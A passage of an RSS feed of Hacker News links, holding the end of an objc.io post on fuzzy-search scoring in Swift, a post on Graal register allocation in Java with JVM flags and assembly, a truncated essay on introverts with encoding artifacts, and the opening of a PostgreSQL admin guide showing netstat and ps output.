</code></pre> <p>When we search for the word <code>string</code>, we’d like the first file to be ranked below the second file. Although the first file contains the characters <code>string</code> in the right order, they are separated by large gaps. The second file contains them without any gaps. In other words, we don’t just want to match file names, we also want to rank them based on the quality of the match, like the number of gaps and gap sizes.</p> <p>We can modify our algorithm to compute a score: when we match a character, we remember the position of that match. We then take the distance between the previous match and current match (the <em>gap</em>) and compute a <em>gap penalty</em>. The gap penalty could be very straightforward, such as the length of the gap, or it could be more complicated, for instance as a constant plus the square root of the length. What function you use depends on the exact use case. In addition, you might want to penalize the gap before the first match and the gap after the last match separately (or not at all).</p> <blockquote> <p>Like before, we can make our algorithm faster by running it on <code>UTF8View</code> instead of on <code>String</code>, but keep in mind that this can change the scoring as well. For example, gap lengths between matches might differ as a character might consist of multiple bytes.</p> </blockquote> <p>Matching a character isn’t as straightforward as just calling <code>==</code> either. For example, when searching for the character <code>e</code>, we almost certainly want to match both <code>e</code> and <code>E</code>. Likewise, we might want to give bonus points when a matched character comes immediately after a separator such as <code>/</code>, <code>.</code> or <code>_</code>.</p> <p>In the <a href="https://talk.objc.io/episodes/S01E212-scoring-results">second episode</a> of the series, we add scoring to the algorithm.</p> <h2>Better Scoring</h2> <p>Unfortunately, the scoring algorithm we described above still isn’t good enough, as it doesn’t calculate the <em>optimal score</em>. It matches characters <a href="https://en.wikipedia.org/wiki/Greedy_algorithm">greedily</a>. For example, if we search for the characters <code>string</code> in <code>source/string.swift</code>, it greedily matches the first <code>s</code>, computes the gap penalty for <code>ource/s</code> and then matches <code>tring</code>. To compute the optimal score we need to consider two cases when we find a match: we need to compute the case in which we accept the match, and the case in which we skip the character and try to find it later in the string. Then we simply take the maximum score of both options.</p> <p>We can implement that (naively) using a recursive algorithm:</p> <pre><code>extension Substring {
    func fuzzyMatch2(_ needle: Substring, gap: Int?) -&gt; Score? {
        guard !needle.isEmpty else { return Score() }
        guard !self.isEmpty else { return nil }

        let skipScore = { self.dropFirst().fuzzyMatch2(needle, gap: gap.map { $0 + 1 }) }
        if self.first == needle.first {
            guard let s = dropFirst().fuzzyMatch2(needle.dropFirst(), gap: 0)
                else { return nil }
            var acceptScore = Score()
            if let g = gap, g &gt; 0 {
                acceptScore.add(-g, reason: "Gap \(g)")
            }
            acceptScore.add(1, reason: "Match \(first!)")
            acceptScore.add(s)

            guard let skip = skipScore() else { return acceptScore }
            return Swift.max(skip, acceptScore)
        } else {
            return skipScore()
        }
    }
}
</code></pre> <p>Note that the algorithm above isn’t very fast because it does a lot more work than it needs to. However, the quality of the results is much better than before. Next up, let’s make it fast.</p> <h2>Fast and Correct Scoring</h2> <p>To make things faster, we can use <a href="https://en.wikipedia.org/wiki/Dynamic_programming">dynamic programming</a>. This means we break up our algorithm recursively in such a way that each step depends directly on the previous step, so that we can compute our result step by step. We can take inspiration from the <a href="https://en.wikipedia.org/wiki/Smith%E2%80%93Waterman_algorithm">Smith-Waterman algorithm</a> and build a two-dimensional matrix that holds the intermediate results. We build up this matrix row by row, where each row represents a character in the needle, and each column represents a character in the filename we’re looking at.</p> <p><img src="https://www.objc.io/images/blog/2020-08-18-matrix-9973e699.png" width="551" alt="Matrix representation"></p> <p>For example, when we search for <code>string</code> in the filename <code>str/testing.swift</code>, we start by matching the character <code>s</code>. In our current implementation, we have a zero penalty for starting gaps, and every matching character gets a score of one. That means that the first row in the matrix contains a score of one for each occurrence of <code>s</code>.</p> <p>The second row matches a <code>t</code>. When see a <code>t</code> we can compute the score by taking the maximum score of all values in the previous row that are to the left of our <code>t</code>. For each of those matches we compute <code>1 + previousScore - gapPenalty</code>. In this case, the final value in the second row is computed as <code>1 + 1 - 3</code>.</p> <p>The score for a filename is the maximum value in the bottom row. For the three filenames above, it’s 6, 6 and 1, respectively.</p> <p>In <a href="https://talk.objc.io/episodes/S01E214-from-recursion-to-loops">episode 4</a> of the series, we migrate from our recursive algorithm to this matrix-based version. In the <a href="https://github.com/objcio/S01E214-quick-open-from-recursion-to-loops">sample code</a> we also provide a GUI that visualizes the matrix, which is great for debugging. When you’re playing around with scoring functions this can be very helpful.</p> <h2>Optimizations</h2> <p>The advantage of a fuzzy search is that we can get to our file very quickly without having to type many characters. This means that the algorithm has to be both correct, yielding the best possible results with few characters, and fast. Now that our algorithm is matrix-based with a few loops, we can make it fast. Our unoptimized version searches 20,000 files (the Swift code base) in about 400ms; to make it <em>feel</em> fast we want it to run in under 16ms, which is the time for a display pass when rendering at 60 frames per second.</p> <p>There are a number of different techniques we show in the series. As a first step, we changed our algorithm to work on <code>UTF8View</code> instead of <code>String</code>, which brought the running time down to about 100ms. Because of Swift’s built-in collections, this change is very simple to make. We further improve efficiency by working on arrays of UTF-8 code units (i.e. bytes) and reached 80ms.</p> <p>In our algorithm, we loop over the previous row to find the maximum score for the previous character in our needle. Rather than starting at the beginning of that row, we can start at the index of the first match. Caching the index brought it down to 45ms.</p> <p>Up until this point our algorithm was a generic method that worked on any <code>Collection</code> type as long as the <code>Element</code> was <code>Equatable</code>. Once we changed it to be a method on <code>Array</code> we could make use of the fact that <code>Array</code> has integer indices, which helps us achieve 37ms.</p> <p>As a final optimization, we parallelized the search by splitting our array of file names into chunks. Matching the number of chunks to processor cores gave us the best results. This lets us search 20,000 files in about 11ms, and comfortably achieve 60 fps. The benchmarks were done while recording our screen, which seems to slow everything down by quite a bit; without screen recording we saw running times of around 6ms. We can even search the ~70,000 files of the Linux kernel code base in under 16ms.</p> <p>These optimizations are documented in the <a href="https://talk.objc.io/episodes/S01E215-optimizing-performance">fifth</a> and <a href="https://talk.objc.io/episodes/S01E216-optimizing-performance-part-2">sixth</a> episode of the series.</p> <p>There are probably a number of further optimizations we could attempt, some of which we discuss in the final episode, but for our purposes the algorithm is fast enough.</p> <h2>Conclusion</h2> <p>We optimized our searching algorithm quite heavily by changing it from a recursive algorithm to a dynamic programming algorithm that builds up intermediate results. This allowed us to further optimize by working on different data structures (UTF-8 bytes instead of Unicode characters), doing less work (e.g. caching some values), and doing work in parallel.</p> <p>You can <a href="https://talk.objc.io/collections/quick-open">watch us discuss and implement these optimizations</a> by <a href="https://talk.objc.io/subscribe">subscribing to Swift Talk</a>. As always, the <a href="https://talk.objc.io/episodes/S01E211-simple-fuzzy-matching">first episode</a> is free to watch.</p> <h2>References</h2> <p>There are many open-source implementations of similar already-existing algorithms. Here are a few we found helpful:</p> <ul> <li><a href="https://www.forrestthewoods.com/blog/reverse_engineering_sublime_texts_fuzzy_match/">Reverse Engineering Sublime Text’s Fuzzy Match</a>, by <a href="https://github.com/forrestthewoods">Forrest Smith</a></li> <li><a href="https://github.com/junegunn/fzf/blob/master/src/algo/algo.go">fzf, a general-purpose command-line fuzzy finder</a>, by <a href="https://github.com/junegunn">Junegunn Choi</a></li> <li><a href="https://github.com/textmate/textmate/blob/master/Frameworks/text/src/ranker.cc">ranker</a>, by <a href="https://github.com/textmate">TextMate</a></li> </ul> </div> </article></div>]]>
            </description>
            <link>https://www.objc.io/blog/2020/08/18/fuzzy-search/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24244971</guid>
            <pubDate>Sat, 22 Aug 2020 15:58:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Seeing Register Allocation Working in Java]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24244856">thread link</a>) | @chrisseaton
<br/>
August 22, 2020 | https://chrisseaton.com/truffleruby/register-allocation/ | <a href="https://web.archive.org/web/*/https://chrisseaton.com/truffleruby/register-allocation/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

<header>

<h2><a href="https://chrisseaton.com/">Chris Seaton</a>, 21 Aug 2020</h2>


<img src="https://chrisseaton.com/truffleruby/register-allocation/title.png" alt="">

</header>

<p>When the Java Virtual Machine compiles your Java code to machine code, one of the jobs it needs to do is to decide where to store Java local variables and other similar temporary values. Your machine has no concept of local variables, so during compilation we need to decide what location in the stack memory, or in a machine register, it’ll use for each variable. This is called <em>register allocation</em>. Register allocation may seem like a complex, abstract, theoretical concept, but in this short post we’re going to show how we can relate the original Java code first to the theory, then to how the compiler sees it, and then to the resulting machine code. What we want to show is that we can easily see the concepts working in practice in a real compiler.</p>

<p>We’re going to be showing output of the Graal just-in-time compiler, but the concepts are similar for other Java just-in-time and ahead-of-time compilers, and for compilers for many other languages.</p>

<p>This Java code runs the method <code>test</code> in a loop to trigger compilation. There is a <code>read</code> method to produce values, a <code>write</code> method to consume them, and a <code>barrier</code> method that simplifies some things and we’ll explain it in the end notes.</p>

<div><div><pre><code><span>class</span> <span>Test</span> <span>{</span>

    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[]</span> <span>args</span><span>)</span> <span>{</span>
        <span>while</span> <span>(</span><span>true</span><span>)</span> <span>{</span>
            <span>test</span><span>();</span>
        <span>}</span>
    <span>}</span>

    <span>private</span> <span>static</span> <span>void</span> <span>test</span><span>()</span> <span>{</span>
        <span>int</span> <span>v0</span> <span>=</span> <span>read</span><span>();</span>
        <span>barrier</span><span>();</span>
        <span>int</span> <span>v1</span> <span>=</span> <span>read</span><span>();</span>
        <span>barrier</span><span>();</span>
        <span>write</span><span>(</span><span>v0</span><span>);</span>
        <span>barrier</span><span>();</span>
        <span>int</span> <span>v2</span> <span>=</span> <span>read</span><span>();</span>
        <span>barrier</span><span>();</span>
        <span>int</span> <span>v3</span> <span>=</span> <span>read</span><span>();</span>
        <span>barrier</span><span>();</span>
        <span>write</span><span>(</span><span>v1</span><span>);</span>
        <span>barrier</span><span>();</span>
        <span>write</span><span>(</span><span>v2</span><span>);</span>
        <span>barrier</span><span>();</span>
        <span>write</span><span>(</span><span>v3</span><span>);</span>
    <span>}</span>

    <span>private</span> <span>static</span> <span>int</span> <span>read</span><span>()</span> <span>{</span>
        <span>return</span> <span>14</span><span>;</span>
    <span>}</span>

    <span>private</span> <span>static</span> <span>void</span> <span>write</span><span>(</span><span>int</span> <span>value</span><span>)</span> <span>{</span>
    <span>}</span>

    <span>private</span> <span>static</span> <span>void</span> <span>barrier</span><span>()</span> <span>{</span>
    <span>}</span>

<span>}</span>
</code></pre></div></div>

<p>We’re going to look at the register allocation in the <code>test</code> method. We’ve removed the calls to <code>barrier</code> between each line for simplicity.</p>

<div><div><pre><code><span>int</span> <span>v0</span> <span>=</span> <span>read</span><span>();</span>
<span>int</span> <span>v1</span> <span>=</span> <span>read</span><span>();</span>
<span>write</span><span>(</span><span>v0</span><span>);</span>
<span>int</span> <span>v2</span> <span>=</span> <span>read</span><span>();</span>
<span>int</span> <span>v3</span> <span>=</span> <span>read</span><span>();</span>
<span>write</span><span>(</span><span>v1</span><span>);</span>
<span>write</span><span>(</span><span>v2</span><span>);</span>
<span>write</span><span>(</span><span>v3</span><span>);</span>
</code></pre></div></div>

<p>We can reason about the register allocation for this program just by looking at the Java code. We want to think about how long each variable needs to be stored for. We call this the <em>live ranges</em>, or <em>intervals</em>. We can do this by drawing a table with each line of code being a line, and having a column for each variable, with a bar showing how long the variable needs to be stored until it can be forgotten.</p>

<p><img src="https://chrisseaton.com/truffleruby/register-allocation/java-1.png" alt="java-1"></p>

<p>The key observation here is that we’ve got four variables that we need to keep alive, but it looks like we can probably fit them into just three storage locations. See how the bars for <code>v0</code> and <code>v2</code> never overlap. <code>v0</code> can be discarded before <code>v2</code> is ever created, so we could re-use the storage for <code>v0</code> for <code>v2</code> later on. We could instead share storage for <code>v0</code> and <code>v3</code> if we wanted to, but let’s use a <em>first-fit</em> approach and re-use the first storage location that’s available.</p>

<p><img src="https://chrisseaton.com/truffleruby/register-allocation/java-2.png" alt="java-2"></p>

<p>A more formal way to look at register allocation is to build a graph where each variable is a node, and there are edges between the nodes if they’re live at the same time. This is an <em>interference graph</em>.</p>

<p><img src="https://chrisseaton.com/truffleruby/register-allocation/graph.png" alt="graph"></p>

<p>Then we solve the problem of giving each node a color, so that adjacent nodes never have the same color. This is <em>graph coloring</em>. We could solve the problem by giving each node a unique color, but we already know this is wasteful.</p>

<p><img src="https://chrisseaton.com/truffleruby/register-allocation/graph-unique.png" alt="graph-unique"></p>

<p>We can see the two solutions we already came up with.</p>

<p><img src="https://chrisseaton.com/truffleruby/register-allocation/graph-1.png" alt="graph-1">
<img src="https://chrisseaton.com/truffleruby/register-allocation/graph-2.png" alt="graph-1"></p>

<p>To now see how Java allocates storage in practice, we can use <a href="https://github.com/graalvm/graalvm-ce-builds/releases/tag/vm-20.1.0">GraalVM CE 20.1 Java 8</a> to compile the Java code as normal.</p>

<div><div><pre><code>% ./graalvm-ce-java8-20.1.0/Contents/Home/bin/javac Test.java
</code></pre></div></div>

<p>We can then run it with some flags set to see what it does with the code. We use <code>-XX:CompileOnly=Test::test</code> so that the calls to <code>read</code>, <code>write</code> and <code>barrier</code> do not inline. If they did inline it would allow the compiler to significantly restructure the program and would obscure what we’re looking for. We use <code>-Dgraal.Dump=:3</code> to write out how the compiler understands the program to a file we can inspect later. We use <code>-XX:+UnlockDiagnosticVMOptions -XX:+PrintAssembly</code> to print the resulting machine code as assembly. We’ll need <a href="https://lafo.ssw.uni-linz.ac.at/pub/graal-external-deps/hsdis/intel/"><code>hsdis</code></a> in the current directory in order to run this.</p>

<div><div><pre><code>% ./graalvm-ce-java8-20.1.0/Contents/Home/bin/java -XX:CompileOnly=Test::test -Dgraal.Dump=:3 -XX:+UnlockDiagnosticVMOptions -XX:+PrintAssembly Test
</code></pre></div></div>

<p>Now we’re going to use a tool called the <a href="https://github.com/chrisseaton/c1visualizer/releases/tag/v1.7">c1visualizer</a>. This tool allows us to look at the how the compiler understands your program in the back-end, when it’s generating code and allocating storage locations to variables.</p>

<div><div><pre><code>% jdkhome=./graalvm-ce-java8-20.1.0/Contents/Home ./c1visualizer/bin/c1visualizer
</code></pre></div></div>

<p>On the left we can see the program move through various phases of the compilation back-end.</p>

<p><img src="https://chrisseaton.com/truffleruby/register-allocation/c1visualizer.png" alt="c1visualizer"></p>

<p>If we look at <em>Before stack slot allocation</em>, we can see <code>v0</code> to <code>v3</code>. In this view, the variables are rows, and the now each column is a Java bytecode instruction in the method, so it’s been rotated ninety degrees. We can see the same four intervals we had in the source code.</p>

<p><img src="https://chrisseaton.com/truffleruby/register-allocation/virtual.png" alt="virtual"></p>

<p>If we look at <em>After stack slot allocation</em>, we can see it’s now allocated machine stack locations for these variables. These numbers are the offset from the start of the stack frame. They don’t go up by four each time, as they are byte addresses, and we’re storing a Java <code>int</code> which is four bytes, and they don’t start at zero as Java stores some other information on the stack beside our variables. We also can see it’s done what we did with pencil-and-paper - it’s stored <code>v0</code> and <code>v2</code> in the same stack location - they’re both in <code>stack:28</code>.</p>

<p><img src="https://chrisseaton.com/truffleruby/register-allocation/concrete.png" alt="concrete"></p>

<p>Finally, we can look at the disassembled machine code generated by the compiler. We’ve simplified it slightly for clarity and we’re still removing the calls to <code>barrier</code>. Each time we call <code>read</code> it returns the value in the <code>%eax</code> register, so an instruction <code>mov %eax,0x14(%rsp)</code> is for example storing the return value into <code>0x14(%rsp)</code>, which is another way to write <code>%rsp + 0x14</code>. <code>%rsp</code> is the stack pointer, so stack locations are addressed relative to the bottom of the current stack (bottom because it grows downward.)</p>

<div><div><pre><code>sub    $0x28,%rsp
mov    %rbp,0x20(%rsp)
callq  read
mov    %eax,0x14(%rsp)
callq  read
mov    %eax,0x10(%rsp)
mov    0x14(%rsp),%esi
callq  write
callq  read
mov    %eax,0x14(%rsp)
callq  read
mov    %eax,0xc(%rsp)
mov    0x10(%rsp),%esi
callq  write
mov    0x14(%rsp),%esi
callq  write
mov    0xc(%rsp),%esi
callq  write
mov    0x20(%rsp),%rbp
add    $0x28,%rsp
</code></pre></div></div>

<p>We can see again, that the first and third calls to <code>read</code> - that’s <code>v0</code> and <code>v2</code> - return a value that is stored into the same location - <code>0x14(%rsp)</code>. <code>v1</code> goes into <code>0x10(%rsp)</code> and <code>v3</code> into <code>0xc(%rsp)</code>. We can draw the same table for this machine code as we did for our Java code.</p>

<p><img src="https://chrisseaton.com/truffleruby/register-allocation/machine.png" alt="machine"></p>

<p>The point of all this is <em>all these diagrams match up in practice</em>! The pencil-and-paper reasoning of the Java code with tables and interference graphs that an undergraduate might do in an exam, matches up with how the production compiler understands it, and matches up with the machine code produced and run. We can see the theory working in practice, pretty directly.</p>

<h2 id="notes">Notes</h2>

<p>We talked about <em>variables</em> being allocated to <em>storage locations</em>. What we really mean by variable is anything that the compiler may want to store - they may not correspond to any real local variables, and not every local variable is necessarily stored.</p>

<p>We started talking about <em>register</em> allocation, but then generalized that to <em>storage location</em>, and then the compiler actually used the stack and no registers. The reason for this is that the values are live across calls, and HotSpot’s internal calling convention does not have any callee-saved registers - the caller must ensure all values are out of registers and saved on the stack.</p>

<p>The purpose of the <code>barrier</code> call is that without it the live ranges shrink somewhat due to them not having to be kept alive for as long, so that they end up not overlapping as we intend. We turned off inlining because without it our <code>barrier</code> call would not work as intended.</p>

<p>The actual register allocation algorithm Graal is using is the <em>linear scan</em> algorithm.</p>

<p>If you noticed that the stack locations shown by the c1visualizer don’t match the offsets in the machine code, it’s because they count in different directions and c1visualizer is also accounting for the return address on the stack. If you noticed that there is apparently empty space in the stack frame, which is due to an extra slot used during deoptimization, and alignment.</p>

<p>Tom Rodriguez helped me answer some questions about the HotSpot calling convention and frame layout.</p>

<hr>

<ul>
  <li><a href="https://chrisseaton.com/truffleruby/">More information about TruffleRuby</a></li>
  <li><a href="https://chrisseaton.com/truffleruby/register-allocation/">Seeing Register Allocation Working in Java</a></li>
  <li><a href="https://chrisseaton.com/truffleruby/basic-graal-graphs/">Understanding Basic Graal Graphs</a></li>
  <li><a href="https://engineering.shopify.com/blogs/engineering/understanding-programs-using-graphs/">Understanding Programs Using Graphs</a></li>
  <li><a href="https://chrisseaton.com/truffleruby/low-overhead-polling/">Low Overhead Polling For Ruby</a></li>
  <li><a href="https://chrisseaton.com/truffleruby/tenthings/">Top 10 Things To Do With GraalVM</a></li>
  <li><a href="https://chrisseaton.com/truffleruby/structs/">Ruby Objects as C Structs and Vice Versa</a></li>
  <li><a href="https://chrisseaton.com/truffleruby/jokerconf17/">Understanding How Graal Works — a Java JIT Compiler Written in Java</a></li>
  <li><a href="https://chrisseaton.com/truffleruby/flip-flops/">Flip-Flops — the 1-in-10-million operator</a></li>
  <li><a href="https://chrisseaton.com/truffleruby/deoptimizing/">Deoptimizing Ruby</a></li>
  <li><a href="https://chrisseaton.com/truffleruby/cext/">Very High Performance C Extensions For JRuby+Truffle</a></li>
  <li><a href="https://chrisseaton.com/truffleruby/small-data-structures/">Optimising Small Data Structures in JRuby+Truffle</a></li>
  <li><a href="https://chrisseaton.com/truffleruby/pushing-pixels/">Pushing Pixels with JRuby+Truffle</a></li>
  <li><a href="https://chrisseaton.com/truffleruby/set_trace_func/">Tracing With Zero Overhead in JRuby+Truffle</a></li>
  <li><a href="https://chrisseaton.com/truffleruby/how-method-dispatch-works-in-jruby-truffle/">How Method Dispatch Works in JRuby+Truffle</a></li>
  <li><a href="https://chrisseaton.com/truffleruby/announcement/">A Truffle/Graal High Performance Backend for JRuby</a></li>
</ul>



<hr>



</article></div>]]>
            </description>
            <link>https://chrisseaton.com/truffleruby/register-allocation/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24244856</guid>
            <pubDate>Sat, 22 Aug 2020 15:45:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Introverts are excluded unfairly in an extraverts’ world]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24244716">thread link</a>) | @Melchizedek
<br/>
August 22, 2020 | https://psyche.co/ideas/introverts-are-excluded-unfairly-in-an-extraverts-world | <a href="https://web.archive.org/web/*/https://psyche.co/ideas/introverts-are-excluded-unfairly-in-an-extraverts-world">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><strong>Life as an introvert</strong> is rarely easy. Ever since I graduated, Iâ€™ve been compelled to work in open-plan offices. Itâ€™s exhausting. Imagine being engaged in a task that requires high concentration, such as looking for a lost earing in the middle of a tennis court. Now imagine that an automatic ball launcher keeps shooting balls directly at you. Wouldnâ€™t you get tired quickly, and be much less efficient in your search? This is how I feel during my work, when sudden and repeating distractions are â€˜shotâ€™ at or near my desk.</p>
<p>The struggle of an introvert doesnâ€™t end in the office. Networking at conferences, some with thousands of attendees, is a central part of an academic career. Picture yourself entering a huge hall, with bright neon lights, hundreds of people in each aisle, and a background din that forces you to yell to be heard. In a typical two-hour poster session, youâ€™re expected to acquire the information you need while also efficiently introducing your own work to colleagues. As an introvert, the experience is equal to riding a terrifying rollercoaster while having to maintain a big smile on your face.</p>
<p>I wish I could say these types of challenge are limited to the work environment, but thatâ€™s not the case. For my most recent birthday, a friend bought me a dinner at EatWith â€“ a meal-sharing platform. Youâ€™re invited to dine in the house of strangers who cook for you and other participating guests. I would enjoy the food and cultural experience if I didnâ€™t have to go through the excruciating labour of small talk with random people. â€˜Sounds like fun,â€™ I said politely to my friend, but privately my immediate sense was that this was yet another ill-designed platform for introverts.</p>
<p>Today, as a psychologist, I know that introversion is a <a href="https://www.pewresearch.org/science/2015/12/11/personality-and-interest-in-science-health-topics/">common</a> trait. Unlike shyness, which is more about a fear of being judged negatively, introversion is defined as a preference for quiet, less stimulating environments. The Swiss psychoanalyst Carl Jung was the first to propose differentiating individuals along an introvert-extravert axis. Writing in the 1920s, he <a href="http://www.cyjack.com/cognition/(ebook%20pdf)%20jung,%20carl%20-%20the%20psychological%20types.pdf">described</a> introverts as preferring to direct their attention inward, to their own feelings and thoughts, and how they lose energy during social interactions. Extraverts, by contrast, direct their attention outward, gain energy from social interactions, and lose energy during periods of solitude.</p>
<p>Beginning in the 1950s, the German-born psychologist Hans Eysenck proposed a physiological explanation for the difference between introverts and extraverts. Extraverts, he <a href="https://onlinelibrary.wiley.com/doi/abs/10.1111/j.2044-8295.1964.tb00912.x">said</a>, have a lower baseline level of cortical arousal relative to introverts, leading them to search for external stimulation to increase their motivation, attention and alertness. Introvertsâ€™ higher baseline arousal levels, in contrast, lead them to withdraw. Contemporary psychology still considers the introversion-extraversion distinction a core aspect of personality (it is one of the <a href="https://psycnet.apa.org/record/1991-09869-001">so-called</a> â€˜Big Fiveâ€™ traits), although it is seen as a continuous spectrum along which we are all positioned, rather than a dichotomous state.</p>
<p>Although thereâ€™s no definitive way of identifying the proportion of introverts in the population, Susan Cain, an influential thinker in the field, has made a reasonable <a href="https://www.penguin.co.uk/books/296/296443/quiet-power/9780241977910.html">estimate</a> that at least a third of people are at one end of this spectrum. The third on the other end are extraverts, and the final third fall somewhere in between â€“ some <a href="https://www.tandfonline.com/doi/abs/10.1207/s15327752jpa4305_14">call</a> these people â€˜ambivertsâ€™. Knowing that introverts comprise an approximately equal share of the population as extraverts, I keep wondering about the missing 33 per cent â€“ where are all the introverts in the ocean of extraverts that surround me in my daily life?</p>
<p>Many of the decisions relating to the daily life of introverts are in the hands of extraverts</p>
<p><strong>While I have introverted</strong> friends, they seem to be vastly outnumbered by my extraverted friends and acquaintances. I have to remind myself that this apparent absence from my daily landscape is not surprising: we introverts are much harder to notice. Introverts probably wonâ€™t be the ones sharing a joke with the entire office, waiting by the coffee machine for a chance to chat, or appearing on television screens as rising reality-show stars. On the contrary, theyâ€™re more likely to enjoy some quiet time by themselves or with a few selected friends, to process their thoughts silently before saying them out loud, and to retreat to their quiet-place to recharge after social interactions.</p>
<p>While the higher visibility of extraverts is self-explanatory, it is far from trivial. Not only does it mean introversion is perceived as less common than it really is, but also introverts are less likely to be evenly represented in influential social groups, including in politics. We risk missing the immense contribution of a large percentage of our employees, students, trainees and friends.</p>
<p>For <a href="https://journals.sagepub.com/doi/10.1177/0894439312462802">example</a>, extraverts are more likely to take part in political engagements, such as disseminating political messages and signing petitions, both on the internet and offline. Negative political messages, which seem so common nowadays, <a href="https://jspp.psychopen.eu/article/view/280">deter</a> introverts from participating in politics, while having the opposite influence on extraverts, including increasing their likelihood of voting, rallying or volunteering for a political campaign. Extraverts are more <a href="https://www.sciencedirect.com/science/article/pii/S0747563209001472">active</a> on social media. They also have easier access to higher corporate ranks, due to the high attention they draw to themselves and to social <a href="https://onlinelibrary.wiley.com/doi/abs/10.1111/fire.12173">stereotypes</a> that associate extravert characteristics with leadership. This state of affairs leaves many of the decisions relating to the daily life of introverts in the hands of the extraverts.</p>
<p>Unfortunately, the greater representation of extraverts in social and political life is self-perpetuating. Working conditions chosen by extraverts to suit extraverts increase the burden on introverts. For instance, group meetings, in which each participant contributes thoughts in a disorganised, dominance-based manner, can put introverts at a disadvantage. The overabundance of extraverts in managing and recruitment roles also decreases the likelihood of introverts winning promotion due to whatâ€™s <a href="https://psycnet.apa.org/record/2016-02267-014">called</a> the â€˜similarity biasâ€™ â€“ our tendency to prefer people who are similar to ourselves. This is not only unfair to introverts, itâ€™s to the detriment of organisations.</p>
<p>Leadership is commonly associated with extraversion, but history teaches us that introverts can serve as powerful leaders. Rosa Parks, a leading activist in the American civil rights movement, was quiet and reserved. Her brave actions, more than her words, led to a crucial turning-point in the struggle. Similarly, while serving as US president, Barack Obama eagerly protected his solitude in the evenings, spending the time reading and concentrating on work decisions. His preference for small group outings rather than big social events didnâ€™t deprive him of extraordinary communication skills and the ability to make bold decisions. In <a href="https://www.tandfonline.com/doi/abs/10.1080/10904018.2016.1202770">contrast</a> to the mistaken perception of introverts as snobbish, misanthropic or depressed, we can be highly empathic, with strong communicative skills.</p>
<p>But itâ€™s not a case of establishing whether introverts or extraverts make better leaders, rather each brings something different, and diversity is often key to effective leadership. For <a href="https://link.springer.com/article/10.1007/s11365-014-0334-3">instance</a>, entrepreneurial teams perform better when leadership is shared between individuals, but only if they have diverse personality traits. Moreover, teams dominated by extraverted members <a href="https://psycnet.apa.org/record/2011-15936-006">actually</a> perform better under introverted leaders, possibly due to their greater responsiveness to their employeesâ€™ ideas.</p>
<p>Introversion is not something to be fixed â€“ but a blessed source of human diversity</p>
<p>The main cultural problem is that introverts are widely seen as not adapted to the environment, instead of it being acknowledged that the environment is designed to profit extraverts. Societyâ€™s praise and acceptance of extraversion as the norm has led many introverts, along with many ambiverts, to suppress different aspects of their personality, or to see them as flaws. This state of affairs is bad not only for introverts, but for society as a whole.</p>
<p><strong>The bias begins already</strong> in the first grade of school. Learning in a big classroom environment might be cost-efficient, but is by no means the best model for everyone. Some kids, especially the introverts, will struggle in the continuous company of a large number of others and the constant requirement to engage in group work. The same misconception â€“ placing the onus on introverts to change â€“ is also reflected in the recent <a href="https://psycnet.apa.org/record/2011-18181-001">proposal</a> that introverts would be happier if only they â€˜acted more extravertedâ€™, even if acting this way counteracts their natural tendencies.</p>
<p>Simple changes across society could be made to mitigate the inequities faced by introverts. In the educational system, for example, designated private spaces in schools could enable periodic shelter for those introverted kids and others who need a place to recharge. Introverts could also profit from greater access to online learning and sharing platforms, with asynchronous communication <a href="https://link.springer.com/chapter/10.1007/978-1-4471-0625-8_15">enabling</a> them to think and research an area without the pressure to respond immediately. Creating equal opportunities for participation in class, such as giving students time to think, the autonomy to decide to work alone or to write their ideas instead of presenting them verbally, could also help rebalance the traditional inequity.</p>
<p>In business and academic settings, workers should have more autonomy in choosing their working conditions. In meetings, stating the topics to be discussed in advance could allow more time for introverts to prepare and process the information. Allocating time for each attendee to speak could also give introverts the chance to express their thoughts. There should be more questioning of whether group meetings are necessarily the best platform for disseminating …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://psyche.co/ideas/introverts-are-excluded-unfairly-in-an-extraverts-world">https://psyche.co/ideas/introverts-are-excluded-unfairly-in-an-extraverts-world</a></em></p>]]>
            </description>
            <link>https://psyche.co/ideas/introverts-are-excluded-unfairly-in-an-extraverts-world</link>
            <guid isPermaLink="false">hacker-news-small-sites-24244716</guid>
            <pubDate>Sat, 22 Aug 2020 15:23:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[PostgeSQL Junior Admin Guide]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24244514">thread link</a>) | @lukasbar
<br/>
August 22, 2020 | https://knowledgepill.it/posts///postgresql-basics-guide/ | <a href="https://web.archive.org/web/*/https://knowledgepill.it/posts///postgresql-basics-guide/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <h2 id="configure-remote-access---listen-address">Configure remote access - listen address</h2>
<p>By default after installation and creating database cluster PostgreSQL will listen only on localhost. No remote access will be allowed.</p>
<hr>
<p><a href="https://knowledgepill.it/posts/postgresql_installation/">PostgreSQL installation on Linux - with database creation</a></p>
<hr>
<div><pre><code data-lang="bash"><span>[</span>postgres@postgres-lab ~<span>]</span>$ netstat -lptnu | grep post
<span>(</span>Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.<span>)</span>
tcp        <span>0</span>      <span>0</span> 127.0.0.1:5432          0.0.0.0:*               LISTEN      1977/postmaster     
tcp6       <span>0</span>      <span>0</span> ::1:5432                :::*                    LISTEN      1977/postmaster     
</code></pre></div><p>To change listen address we have to configure parameter in <code>postgresql.conf</code></p>
<p>Check <code>PGDATA</code> - after <code>-D</code> parameter:</p>
<div><pre><code data-lang="bash"><span>[</span>postgres@postgres-lab ~<span>]</span>$ ps aux | grep postgres
postgres  <span>1977</span>  0.0  2.5 <span>286388</span> <span>14864</span> ?        Ss   Jun28   0:02 /usr/pgsql-12/bin/postmaster -D /postgresql/data
postgres  <span>1979</span>  0.0  0.2 <span>140768</span>  <span>1360</span> ?        Ss   Jun28   0:00 postgres: logger   
